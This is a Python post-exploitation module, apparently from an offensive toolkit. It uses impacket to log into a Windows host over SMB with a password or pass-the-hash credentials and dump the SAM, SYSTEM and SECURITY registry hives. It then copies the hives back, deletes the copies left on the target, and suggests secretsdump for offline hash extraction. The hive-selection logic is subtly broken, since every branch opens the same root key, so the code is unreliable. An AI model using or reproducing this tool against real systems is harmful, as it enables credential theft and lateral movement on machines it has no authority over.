
# scripts/smb/post/reg_dump.py
"""
Dump sensitive registry hives (SAM, SYSTEM, SECURITY) via SMB.
Saves hives to local disk for offline hash extraction.
Requires admin privileges.
"""
import os
from pathlib import Path
from core.output import console, print_result
from core import session_db
from scripts.base import BaseScript

try:
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import transport, winreg
    _OK = True
except ImportError:
    _OK = False

_HIVES = {
    "SAM":      "SAM",
    "SYSTEM":   "SYSTEM",
    "SECURITY": "SECURITY",
}


class Script(BaseScript):
    name        = "reg-dump"
    protocol    = "smb"
    category    = "post"
    description = (
        "Dump SAM, SYSTEM and SECURITY registry hives to disk via SMB/WinReg. "
        "Requires admin. Use with secretsdump to extract hashes offline."
    )

    def run(self, **kwargs):
        if not _OK:
            console.print("[red]impacket not installed.[/red]"); return None

        ip      = self.target.ip
        domain  = self.creds.domain   or ""
        user    = self.creds.user     or ""
        passwd  = self.creds.password or ""
        nt_hash = self.creds.hash     or ""
        timeout = self.target.timeout or 5
        out_dir = str(kwargs.get("out_dir", "."))

        lm_hash = ""
        if nt_hash and ":" in nt_hash:
            lm_hash, nt_hash = nt_hash.split(":", 1)

        Path(out_dir).mkdir(parents=True, exist_ok=True)
        saved = []

        try:
            conn = SMBConnection(ip, ip, timeout=timeout)
            conn.login(user, passwd, domain, lm_hash, nt_hash)
            rpctransport = transport.SMBTransport(ip, filename="\\\\winreg", smb_connection=conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(winreg.MSRPC_UUID_RRP)

            for hive_name in _HIVES:
                try:
                    # Save hive to a temp path on the remote system
                    remote_tmp = f"C:\\Windows\\Temp\\{hive_name}.tmp"
                    local_path = os.path.join(out_dir, f"{ip}_{hive_name}.hive")

                    # Open hive root handle
                    if hive_name == "SAM":
                        resp = winreg.hOpenLocalMachine(dce)
                    elif hive_name == "SYSTEM":
                        resp = winreg.hOpenLocalMachine(dce)
                    else:
                        resp = winreg.hOpenLocalMachine(dce)
                    root_key = resp["phKey"]

                    # Save hive
                    winreg.hBaseRegSaveKey(dce, root_key, remote_tmp)

                    # Download via SMB
                    remote_smb_path = remote_tmp.replace("C:\\", "\\").replace("\\\\", "\\")
                    with open(local_path, "wb") as fh:
                        conn.getFile("C$", remote_smb_path.lstrip("\\"), fh.write)

                    # Clean up remote tmp
                    try:
                        conn.deleteFile("C$", remote_smb_path.lstrip("\\"))
                    except Exception:
                        pass

                    winreg.hBaseRegCloseKey(dce, root_key)
                    saved.append((hive_name, local_path))
                    print_result("SMB", ip, "ok", f"Hive {hive_name} saved to {local_path}")
                    session_db.DB.SaveFinding(ip, "SMB", "reg_dump",
                                               f"hive={hive_name} local={local_path}")
                except Exception as e:
                    print_result("SMB", ip, "fail", f"Could not dump {hive_name}: {e}")

            dce.disconnect(); conn.logoff()
        except Exception as e:
            print_result("SMB", ip, "fail", f"WinReg connection failed: {e}"); return None

        if saved:
            console.print(f"\n[bold green]{len(saved)} hive(s) saved.[/bold green]")
            console.print("[dim]Extract hashes with:[/dim]")
            console.print(f"[dim]  secretsdump.py -sam {ip}_SAM.hive -system {ip}_SYSTEM.hive LOCAL[/dim]")
        return saved
